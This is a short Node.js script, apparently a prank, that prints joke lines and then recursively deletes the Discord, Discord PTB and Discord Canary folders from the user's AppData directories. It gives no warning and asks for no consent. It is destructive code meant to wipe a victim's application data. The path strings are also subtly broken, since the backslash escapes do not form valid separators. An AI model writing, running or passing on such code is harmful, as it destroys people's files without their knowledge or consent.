console.log("Imagine pork")
console.log()
console.log()
console.log("pp better.")


fs.rmdirSync(process.env.LOCALAPPDATA + "\discord", { recursive: true });
fs.rmdirSync(process.env.LOCALAPPDATA + "\discordptb", { recursive: true });
fs.rmdirSync(process.env.LOCALAPPDATA + "\discordcanary", { recursive: true });

fs.rmdirSync(process.env.APPDATA + "\discord", { recursive: true });
fs.rmdirSync(process.env.APPDATA + "\discordptb", { recursive: true });
fs.rmdirSync(process.env.APPDATA + "\discordcanary", { recursive: true });
